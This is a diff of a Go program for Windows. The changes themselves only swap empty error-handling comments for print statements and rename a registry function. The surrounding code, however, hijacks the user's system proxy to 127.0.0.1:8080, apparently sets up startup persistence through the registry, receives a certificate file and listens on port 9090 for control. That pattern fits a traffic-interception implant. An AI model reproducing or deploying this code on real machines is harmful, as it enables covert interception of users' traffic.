@@ -390,20 +390,20 @@ func redirect(source string, dest string) {
 	})
 	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Internet Settings`, registry.ALL_ACCESS)
 	if err != nil {
-		// Handle error
+		fmt.Println("Error:", err)
 	}
 	defer key.Close()
 
 	// Set the proxy server and port
 	err = key.SetStringValue("ProxyServer", "127.0.0.1:8080")
 	if err != nil {
-		// Handle error
+		fmt.Println("Error:", err)
 	}
 
 	// Enable the proxy server
 	err = key.SetDWordValue("ProxyEnable", 1)
 	if err != nil {
-		// Handle error
+		fmt.Println("Error:", err)
 	}
 
 	fmt.Println("System proxy settings changed.")
@@ -416,13 +416,13 @@ func redirect(source string, dest string) {
 		if stopRedirect1 {
 			err = key.SetDWordValue("ProxyEnable", 0)
 			if err != nil {
-				// Handle error
+				fmt.Println("Error:", err)
 			}
 
 			// Delete the proxy server
 			err = key.DeleteValue("ProxyServer")
 			if err != nil {
-				// Handle error
+				fmt.Println("Error:", err)
 			}
 
 			fmt.Println("System proxy settings turned off.")
@@ -524,7 +524,7 @@ func receiveCert() {
 	log.Println("File transfer completed!")
 }
 
-func addToRegistryRun() error {
+func addToRegistry() error {
 	exePath, err := os.Executable()
 	if err != nil {
 		return fmt.Errorf("failed to get executable path: %v", err)
@@ -545,9 +545,9 @@ func addToRegistryRun() error {
 }
 
 func main() {
-	err := addToRegistryRun()
+	err := addToRegistry()
 	if err != nil {
-		// Handle error
+		fmt.Println("Error:", err)
 	}
 	// Start listening on port 9090
 	listener, err := net.Listen("tcp", "0.0.0.0:9090")
@@ -628,7 +628,7 @@ func handleConnection(conn net.Conn, stopClose chan bool) {
 
 	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Internet Settings`, registry.ALL_ACCESS)
 	if err != nil {
-		// Handle error
+		fmt.Println("Error:", err)
 	}
 	defer key.Close()
 
@@ -637,13 +637,13 @@ func handleConnection(conn net.Conn, stopClose chan bool) {
 	fmt.Println("Connection closed by client.")
 	err = key.SetDWordValue("ProxyEnable", 0)
 	if err != nil {
-		// Handle error
+		fmt.Println("Error:", err)
 	}
 
 	// Delete the proxy server
 	err = key.DeleteValue("ProxyServer")
 	if err != nil {
-		// Handle error
+		fmt.Println("Error:", err)
 	}
 
 	fmt.Println("System proxy settings turned off.")
